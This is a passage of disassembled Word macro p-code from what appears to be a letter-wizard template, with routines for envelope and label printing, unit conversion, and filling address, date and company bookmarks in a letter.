' 	Ld WordBasic 
' 	ArgsMemLd Window 0x0000 
' 	Ld iWorkDoc 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #390:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall DocClose 0x0001 
' 	QuoteRem 0x001D 0x0020 "Close the document(w/out saving)"
' Line #391:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	Ld emptyDoc$ 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #392:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall DocClose 0x0001 
' 	QuoteRem 0x001D 0x0013 "Close the empty doc"
' Line #393:
' 	ElseBlock 
' Line #394:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall WaitCursor 0x0001 
' Line #395:
' 	Ld gDoogie 
' 	ParamNamed BlueScreen 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsGeneral 0x0001 
' Line #396:
' 	Ld iWorkDoc 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall WindowList 0x0001 
' 	QuoteRem 0x0028 0x001B "ensure work doc is in front"
' Line #397:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #398:
' 	Ld gEnvelopeLabel 
' 	IfBlock 
' Line #399:
' 	LitStr 0x0009 "recipAddr"
' 	Ld WordBasic 
' 	ArgsMemLd ExistingBookmark 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "recipAddr"
' 	Ld WordBasic 
' 	ArgsMemCall WW7_EditGoTo 0x0001 
' 	EndIf 
' Line #400:
' 	LitDI2 0x0000 
' 	Ld dlgEL 
' 	MemSt ExtractAddress 
' Line #401:
' 	Ld dlgEL 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd ToolsEnvelopesAndLabels 0x0001 
' 	St x 
' 	QuoteRem 0x0040 0x0022 "we already setup dlgEL (see below)"
' Line #402:
' 	Ld dlgEL 
' 	MemLd AddrText 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #403:
' 	Ld dlgEL 
' 	MemLd EnvAddress 
' 	St faddr 
' Line #404:
' 	ElseBlock 
' Line #405:
' 	Ld dlgEL 
' 	MemLd AddrText 
' 	St faddr 
' Line #406:
' 	EndIfBlock 
' Line #407:
' 	Ld dlgEL 
' 	MemLd RetAddrText 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #408:
' 	Ld dlgEL 
' 	MemLd EnvReturn 
' 	St freaddr 
' Line #409:
' 	ElseBlock 
' Line #410:
' 	Ld dlgEL 
' 	MemLd RetAddrText 
' 	St freaddr 
' Line #411:
' 	EndIfBlock 
' Line #412:
' 	Ld x 
' 	SelectCase 
' Line #413:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #414:
' 	Ld dlgEL 
' 	MemLd Text 
' 	LitStr 0x0001 "0"
' 	Ne 
' 	IfBlock 
' Line #415:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd MailingLabel 
' 	MemSt DefaultPrintBarCode 
' Line #416:
' 	Ld faddr 
' 	ParamNamed Address 
' 	Ld Application 
' 	MemLd MailingLabel 
' 	ArgsMemCall PrintOut 0x0001 
' Line #417:
' 	ElseBlock 
' Line #418:
' 	Ld dlgEL 
' 	MemLd ExtractAddress 
' 	ParamNamed ExtractAddress 
' 	Ld faddr 
' 	ParamNamed Address 
' 	Ld freaddr 
' 	ParamNamed returnAddress 
' 	Ld ActiveDocument 
' 	MemLd Envelope 
' 	ArgsMemCall PrintOut 0x0003 
' Line #419:
' 	EndIfBlock 
' Line #420:
' 	QuoteRem 0x0014 0x0019 " need to print a document"
' Line #421:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #422:
' 	Ld dlgEL 
' 	MemLd Text 
' 	LitStr 0x0001 "0"
' 	Ne 
' 	IfBlock 
' Line #423:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd MailingLabel 
' 	MemSt DefaultPrintBarCode 
' Line #424:
' 	Ld faddr 
' 	ParamNamed Address 
' 	Ld Application 
' 	MemLd MailingLabel 
' 	ArgsMemCall CreateNewDocument 0x0001 
' Line #425:
' 	ElseBlock 
' Line #426:
' 	Ld dlgEL 
' 	MemLd ExtractAddress 
' 	ParamNamed ExtractAddress 
' 	Ld faddr 
' 	ParamNamed Address 
' 	Ld freaddr 
' 	ParamNamed returnAddress 
' 	Ld ActiveDocument 
' 	MemLd Envelope 
' 	ArgsMemCall Insert 0x0003 
' Line #427:
' 	EndIfBlock 
' Line #428:
' 	QuoteRem 0x0014 0x0029 " need to do a WindowList(iWorkDoc) here.."
' Line #429:
' 	CaseElse 
' Line #430:
' 	QuoteRem 0x0014 0x000A "do nothing"
' Line #431:
' 	EndSelect 
' Line #432:
' 	LitStr 0x000A "letterbody"
' 	Ld WordBasic 
' 	ArgsMemLd ExistingBookmark 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #433:
' 	LitStr 0x000A "letterbody"
' 	Ld WordBasic 
' 	ArgsMemCall WW7_EditGoTo 0x0001 
' Line #434:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall LineDown 0x0002 
' Line #435:
' 	EndIfBlock 
' Line #436:
' 	EndIfBlock 
' Line #437:
' 	LitDI2 0x0000 
' 	ParamNamed Store 
' 	Ld Normal_$ 
' 	ParamNamed Template 
' 	LitDI2 0x0000 
' 	ParamNamed LinkStyles 
' 	Ld WordBasic 
' 	ArgsMemCall FileTemplates 0x0003 
' Line #438:
' 	QuoteRem 0x0008 0x0088 "WindowNumber changes when user selects Envelops and Labels since in some languages it is opened as "address" and comes before empty doc."
' Line #439:
' 	LitDI2 0x0001 
' 	St iWindowNumber 
' Line #440:
' 	Ld iWindowNumber 
' 	Ld WordBasic 
' 	ArgsMemLd CountWindows 0x0000 
' 	Le 
' 	Paren 
' 	While 
' Line #441:
' 	Ld iWindowNumber 
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0001 
' 	Ld emptyDoc$ 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #442:
' 	Ld iWindowNumber 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall WindowList 0x0001 
' Line #443:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall DocClose 0x0001 
' Line #444:
' 	EndIfBlock 
' Line #445:
' 	Ld iWindowNumber 
' 	LitDI2 0x0001 
' 	Add 
' 	St iWindowNumber 
' Line #446:
' 	Wend 
' Line #447:
' Line #448:
' 	EndIfBlock 
' Line #449:
' 	QuoteRem 0x0004 0x0009 "All done!"
' Line #450:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #451:
' Line #452:
' 	EndSub 
' 	QuoteRem 0x0008 0x000E "%% StartWizard"
' Line #453:
' Line #454:
' 	QuoteRem 0x0000 0x0036 "======================================================"
' Line #455:
' 	QuoteRem 0x0000 0x001B "%% Wizard-specific routines"
' Line #456:
' Line #457:
' 	FuncDefn (Private Sub GetPrewrittenDetails())
' Line #458:
' 	Dim 
' 	VarDefn def
' Line #459:
' 	Dim 
' 	VarDefn path
' Line #460:
' 	Dim 
' 	VarDefn i
' Line #461:
' 	Ld kLookingForLetters$ 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #462:
' 	LitStr 0x000A "LetterName"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	St def$ 
' Line #463:
' 	LitDI2 0x0001 
' 	UMi 
' 	St defLttr 
' Line #464:
' 	Ld kLetterPath$ 
' 	ArgsLd xFetchPref$ 0x0001 
' 	St path$ 
' 	QuoteRem 0x0026 0x0026 "Has this been defined in wordwiz.ini??"
' Line #465:
' 	Ld path$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld kLetterPath$ 
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0001 
' 	St path$ 
' 	EndIf 
' 	QuoteRem 0x004B 0x0024 "..How about in win.ini/winword6.ini?"
' Line #466:
' 	Ld path$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0017 0x0034 "No, so assume they're in subdir of program directory"
' Line #467:
' 	LitDI2 0x0009 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St path$ 
' 	QuoteRem 0x002B 0x0015 "get program directory"
' Line #468:
' Line #469:
' 	Ld path$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #470:
' 	Ld path$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld path$ 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St path$ 
' 	EndIf 
' Line #471:
' 	Ld path$ 
' 	Ld kLettersDir$ 
' 	Add 
' 	St path$ 
' 	QuoteRem 0x0030 0x0014 "letters subdirectory"
' Line #472:
' 	Ld path$ 
' 	LitStr 0x0003 "*.*"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld path$ 
' 	Ld path$ 
' 	FnLen 
' 	LitDI2 0x0008 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	St path$ 
' 	EndIf 
' Line #473:
' 	ElseBlock 
' Line #474:
' 	LitStr 0x0001 "."
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	St path$ 
' 	QuoteRem 0x0034 0x001A "this is the best we can do"
' Line #475:
' 	EndIfBlock 
' Line #476:
' 	EndIfBlock 
' Line #477:
' 	Ld path$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld path$ 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St path$ 
' 	EndIf 
' Line #478:
' 	Ld path$ 
' 	St LettersPath$ 
' Line #479:
' 	Ld kLoadingLetterDetails$ 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #480:
' 	Label LExit 
' Line #481:
' 	EndSub 
' Line #482:
' Line #483:
' 	FuncDefn (Private Function GetDefaultUnits())
' Line #484:
' 	Dim 
' 	VarDefn dlgTO (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd ToolsOptionsGeneral 0x0001 
' 	Set dlgTO 
' Line #485:
' 	Ld dlgTO 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall ToolsOptionsGeneral 0x0001 
' Line #486:
' 	Ld dlgTO 
' 	MemLd Units 
' 	St GetDefaultUnits 
' Line #487:
' 	EndFunc 
' Line #488:
' Line #489:
' 	FuncDefn (Private Function UnitName(unit))
' Line #490:
' 	Ld unit 
' 	SelectCase 
' Line #491:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #492:
' 	LitStr 0x0004 "­^¦T"
' 	St UnitName$ 
' Line #493:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #494:
' 	LitStr 0x0004 "¤½¤À"
' 	St UnitName$ 
' Line #495:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #496:
' 	LitStr 0x0004 "ÂI¼Æ"
' 	St UnitName$ 
' Line #497:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #498:
' 	LitStr 0x0002 "pi"
' 	St UnitName$ 
' Line #499:
' 	CaseElse 
' Line #500:
' 	LitStr 0x0000 ""
' 	St UnitName$ 
' Line #501:
' 	LitStr 0x000E "Unknown units!"
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' 	QuoteRem 0x0036 0x000A "debug only"
' Line #502:
' 	EndSelect 
' Line #503:
' 	EndFunc 
' Line #504:
' Line #505:
' 	FuncDefn (Private Function ConvertInchesToUnits(oldVal, newUnits))
' Line #506:
' 	Dim 
' 	VarDefn newVal
' Line #507:
' 	Ld newUnits 
' 	SelectCase 
' Line #508:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	QuoteRem 0x0010 0x0006 "inches"
' Line #509:
' 	Ld oldVal 
' 	St newVal 
' Line #510:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	QuoteRem 0x0010 0x0002 "cm"
' Line #511:
' 	Ld oldVal 
' 	LitR8 0xB852 0x851E 0x51EB 0x4004 
' 	Mul 
' 	St newVal 
' Line #512:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	QuoteRem 0x0010 0x0003 "pts"
' Line #513:
' 	Ld oldVal 
' 	LitDI2 0x0048 
' 	Mul 
' 	St newVal 
' Line #514:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	QuoteRem 0x0010 0x0002 "pi"
' Line #515:
' 	Ld oldVal 
' 	LitDI2 0x0006 
' 	Mul 
' 	St newVal 
' Line #516:
' 	CaseElse 
' Line #517:
' 	Ld oldVal 
' 	St newVal 
' Line #518:
' 	LitStr 0x000E "Unknown units!"
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #519:
' 	EndSelect 
' Line #520:
' 	Ld newVal 
' 	St ConvertInchesToUnits 
' Line #521:
' 	EndFunc 
' Line #522:
' Line #523:
' 	FuncDefn (Private Function ConvertUnitsToInches(oldVal, oldUnits))
' Line #524:
' 	Dim 
' 	VarDefn newVal
' Line #525:
' 	Ld oldUnits 
' 	SelectCase 
' Line #526:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0014 
' 	QuoteRem 0x0014 0x0006 "inches"
' Line #527:
' 	Ld oldVal 
' 	St newVal 
' Line #528:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0012 
' 	QuoteRem 0x0012 0x0002 "cm"
' Line #529:
' 	Ld oldVal 
' 	LitR8 0xB852 0x851E 0x51EB 0x4004 
' 	Div 
' 	St newVal 
' Line #530:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	QuoteRem 0x0010 0x0003 "pts"
' Line #531:
' 	Ld oldVal 
' 	LitDI2 0x0048 
' 	Div 
' 	St newVal 
' Line #532:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	QuoteRem 0x0010 0x0002 "pi"
' Line #533:
' 	Ld oldVal 
' 	LitDI2 0x0006 
' 	Div 
' 	St newVal 
' Line #534:
' 	CaseElse 
' Line #535:
' 	Ld oldVal 
' 	St newVal 
' Line #536:
' 	LitStr 0x000E "Unknown units!"
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #537:
' 	EndSelect 
' Line #538:
' 	Ld newVal 
' 	St ConvertUnitsToInches 
' Line #539:
' 	EndFunc 
' Line #540:
' Line #541:
' 	FuncDefn (Private Function PrettyMeasurement(theVal, theUnits))
' Line #542:
' 	Dim 
' 	VarDefn v
' Line #543:
' 	Dim 
' 	VarDefn u
' Line #544:
' 	Ld theVal 
' 	LitDI2 0x000B 
' 	Lt 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	Ld theVal 
' 	LitDI2 0x0002 
' 	Mul 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	LitDI2 0x0002 
' 	Div 
' 	St v 
' 	Else 
' 	BoSImplicit 
' 	Ld theVal 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St v 
' 	EndIf 
' Line #545:
' 	Ld theUnits 
' 	ArgsLd UnitName$ 0x0001 
' 	St u$ 
' Line #546:
' 	Ld theUnits 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 " "
' 	Ld u$ 
' 	Add 
' 	St u$ 
' 	EndIf 
' Line #547:
' 	Ld v 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	Ld u$ 
' 	Add 
' 	St PrettyMeasurement$ 
' Line #548:
' 	EndFunc 
' Line #549:
' Line #550:
' 	Rem 0x0029 " This function assumes input is in inches"
' Line #551:
' 	FuncDefn (Private Function RightDistanceToLeftDistance(fromEdgeInches))
' Line #552:
' 	Dim 
' 	VarDefn fromEdgeDef
' Line #553:
' 	Dim 
' 	VarDefn dlgPg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FilePageSetup 0x0001 
' 	Set dlgPg 
' Line #554:
' 	Ld dlgPg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FilePageSetup 0x0001 
' Line #555:
' 	Ld fromEdgeInches 
' 	Ld GetDefaultUnits 
' 	ArgsLd ConvertInchesToUnits 0x0002 
' 	St fromEdgeDef 
' Line #556:
' 	Ld dlgPg 
' 	MemLd PageWidth 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	Ld dlgPg 
' 	MemLd LeftMargin 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	Sub 
' 	Ld dlgPg 
' 	MemLd RightMargin 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	Sub 
' 	Ld fromEdgeDef 
' 	Sub 
' 	ArgsLd Str 0x0001 
' 	St RightDistanceToLeftDistance$ 
' Line #557:
' 	EndFunc 
' Line #558:
' Line #559:
' 	FuncDefn (Private Sub InsertRedSlot(s))
' 	QuoteRem 0x0020 0x0020 "DAPFEL, Changed to a MacroButton"
' Line #560:
' 	QuoteRem 0x0018 0x002B "MUST HAVE EmptyMacro macro in .wiz template"
' Line #561:
' 	LitDI2 0x0001 
' 	ParamNamed FieldCodes 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsView 0x0001 
' Line #562:
' 	Ld kMacroButton$ 
' 	ParamNamed Field 
' 	Ld WordBasic 
' 	ArgsMemCall InsertField 0x0001 
' Line #563:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall CharLeft 0x0001 
' Line #564:
' 	Ld kEmptyMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #565:
' 	LitStr 0x0001 "["
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #566:
' 	Ld s$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #567:
' 	LitStr 0x0001 "]"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #568:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall CharRight 0x0001 
' Line #569:
' 	LitDI2 0x0000 
' 	ParamNamed FieldCodes 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsView 0x0001 
' Line #570:
' 	EndSub 
' Line #571:
' Line #572:
' 	FuncDefn (Private Sub SubstituteBananas())
' Line #573:
' 	Dim 
' 	VarDefn v
' Line #574:
' 	Dim 
' 	VarDefn letterIndex
' Line #575:
' 	Dim 
' 	VarDefn ii
' Line #576:
' 	ArgsCall DoStyleMerge 0x0000 
' Line #577:
' 	LitStr 0x0009 "bkAddress"
' 	Ld WordBasic 
' 	ArgsMemLd ExistingBookmark 0x0001 
' 	IfBlock 
' Line #578:
' 	LitStr 0x0009 "bkAddress"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed If 
' 	Ld WordBasic 
' 	ArgsMemCall EditBookmark 0x0002 
' Line #579:
' 	QuoteRem 0x0000 0x0052 "If recipient address is same as default address(AT entry) then insert boilerplates"
' Line #580:
' 	LitStr 0x0014 "textRecipientAddress"
' 	Ld WordBasic 
' 	ArgsMemLd [DlgText$] 0x0001 
' 	St v$ 
' Line #581:
' 	Ld v$ 
' 	Ld kAddressATEntry$ 
' 	Ne 
' 	IfBlock 
' Line #582:
' 	Ld v$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #583:
' 	Ld v$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #584:
' 	ElseBlock 
' Line #585:
' 	Ld WordBasic 
' 	ArgsMemCall EditClear 0x0000 
' 	QuoteRem 0x0024 0x004C "not able to replace selected text with empty string. Text remains unchanged."
' Line #586:
' 	EndIfBlock 
' Line #587:
' 	ElseBlock 
' Line #588:
' 	Ld kRecipient$ 
' 	ArgsCall InsertRedSlot 0x0001 
' Line #589:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #590:
' 	Ld kEnterRecipientAddress$ 
' 	ArgsCall InsertRedSlot 0x0001 
' Line #591:
' 	EndIfBlock 
' Line #592:
' 	EndIfBlock 
' Line #593:
' Line #594:
' 	LitStr 0x0004 "Date"
' 	Ld WordBasic 
' 	ArgsMemLd ExistingBookmark 0x0001 
' 	IfBlock 
' Line #595:
' 	LitStr 0x0004 "Date"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed If 
' 	Ld WordBasic 
' 	ArgsMemCall EditBookmark 0x0002 
' Line #596:
' 	Ld kFormalDateFormat$ 
' 	Ld WordBasic 
' 	ArgsMemCall InsertDateTime 0x0001 
' Line #597:
' 	EndIfBlock 
' Line #598:
' 	LitStr 0x000F "bkReturnAddress"
' 	Ld WordBasic 
' 	ArgsMemLd ExistingBookmark 0x0001 
' 	IfBlock 
' Line #599:
' 	LitStr 0x000F "bkReturnAddress"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed If 
' 	Ld WordBasic 
' 	ArgsMemCall EditBookmark 0x0002 
' Line #600:
' 	Ld WordBasic 
' 	ArgsMemCall WW6_EditClear 0x0000 
' Line #601:
' 	LitStr 0x000D "UseLetterhead"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #602:
' 	LitStr 0x000F "bkReturnAddress"
' 	Ld WordBasic 
' 	ArgsMemCall EditBookmark 0x0001 
' 	QuoteRem 0x0035 0x000B "Plain Paper"
' Line #603:
' 	ElseBlock 
' Line #604:
' 	Ld WordBasic 
' 	ArgsMemCall WW6_EditClear 0x0000 
' 	QuoteRem 0x0024 0x0015 "Remove Paragraph mark"
' Line #605:
' 	EndIfBlock 
' Line #606:
' 	EndIfBlock 
' Line #607:
' Line #608:
' 	LitStr 0x0009 "bkCompany"
' 	Ld WordBasic 
' 	ArgsMemLd ExistingBookmark 0x0001 
' 	IfBlock 
' Line #609:
' 	LitStr 0x0009 "bkCompany"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed If 
' 	Ld WordBasic 
' 	ArgsMemCall EditBookmark 0x0002 
' Line #610:
' 	Ld WordBasic 
' 	ArgsMemCall WW6_EditClear 0x0000 
' Line #611:
' Line #612:
' 	LitStr 0x000D "UseLetterhead"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #613:
' 	LitStr 0x0009 "bkCompany"
' 	Ld WordBasic 
' 	ArgsMemCall EditBookmark 0x0001 
' 	QuoteRem 0x002F 0x000B "Plain Paper"
' Line #614:
' 	ElseBlock 
' Line #615:
' 	Ld WordBasic 
' 	ArgsMemCall WW6_EditClear 0x0000 
' 	QuoteRem 0x0024 0x0015 "Remove Paragraph mark"
' Line #616:
' 	EndIfBlock 
' Line #617:
' 	EndIfBlock 
' Line #618:
' Line #619:
' 	LitStr 0x000D "UseLetterhead"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #620:
' 	LitStr 0x0009 "bkCompany"
' 	Ld WordBasic 
' 	ArgsMemLd ExistingBookmark 0x0001 
' 	IfBlock 
' Line #621:
' 	Ld kStyCmpnyName$ 
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #622:
' 	LitStr 0x0009 "bkCompany"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed If 
' 	Ld WordBasic 
' 	ArgsMemCall EditBookmark 0x0002 
' Line #623:
' 	Ld kTypeCompanyName$ 
' 	ArgsCall InsertRedSlot 0x0001 
' Line #624:
' 	EndIfBlock 
' Line #625:
' 	LitStr 0x0008 "WizStyle"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #626:
' 	LitStr 0x0009 "cntmpgfx2"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Insert 
' 	Ld WordBasic 
' 	ArgsMemCall WW7_EditAutoText 0x0002 
' Line #627:
' 	QuoteRem 0x0008 0x009F "An extra line is introduced with the insertion of AT Entry. Does not affect Resume cover letter and letter to mom, because you do not have "Company Name" style"
' Line #628:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall CharRight 0x0002 
' Line #629:
' 	Ld WordBasic 
' 	ArgsMemCall WW6_EditClear 0x0000 
' Line #630:
' 	ElseBlock 
' Line #631:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #632:
' 	EndIfBlock 
' 	QuoteRem 0x000F 0x000A "Wizstyle=1"
' Line #633:
' Line #634:
' 	LitStr 0x000F "bkReturnAddress"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed If 
' 	Ld WordBasic 
' 	ArgsMemCall EditBookmark 0x0002 
' Line #635:
' 	Ld kStyRetAddr$ 
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #636:
' 	ArgsCall ParseRetAddress 0x0000 
' Line #637:
' 	LitStr 0x0008 "WizStyle"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0002 
' 	Ne 
' 	Paren 
' 	IfBlock 
' 	QuoteRem 0x0036 0x0018 " Cntmp or Prof let style"
' Line #638:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	For 
' Line #639:
' 	Ld ii 
' 	ArgsLd RetAddress__$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #640:
' 	Ld ii 
' 	ArgsLd RetAddress__$ 0x0001 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #641:
' 	ElseBlock 
' Line #642:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #643:
' 	EndIfBlock 
' 	QuoteRem 0x0017 0x000D "RetAddress..."
' Line #644:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #645:
' 	LitDI2 0x0004 
' 	ArgsLd RetAddress__$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0004 
' 	ArgsLd RetAddress__$ 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	EndIf 
' Line #646:
' 	ElseBlock 
' 	QuoteRem 0x000D 0x000D "elegant style"
' Line #647:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	For 
' Line #648:
' 	Ld ii 
' 	ArgsLd RetAddress__$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #649:
' 	Ld ii 
' 	ArgsLd RetAddress__$ 0x0001 
' 	LitStr 0x0004 " ¡E "
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #650:
' 	ElseBlock 
' Line #651:
' 	QuoteRem 0x0014 0x000A "Do Nothing"
' Line #652:
' 	EndIfBlock 
' 	QuoteRem 0x0017 0x000D "RetAddress..."
' Line #653:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #654:
' 	LitDI2 0x0004 
' 	ArgsLd RetAddress__$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #655:
' 	LitDI2 0x0004 
' 	ArgsLd RetAddress__$ 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #656:
' 	ElseBlock 
' Line #657:
' 	LitDI2 0x0003 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall WW6_EditClear 0x0001 
' 	QuoteRem 0x002B 0x0016 "get rid of last bullet"
' Line #658:
' 	EndIfBlock 
' Line #659:
' 	EndIfBlock 
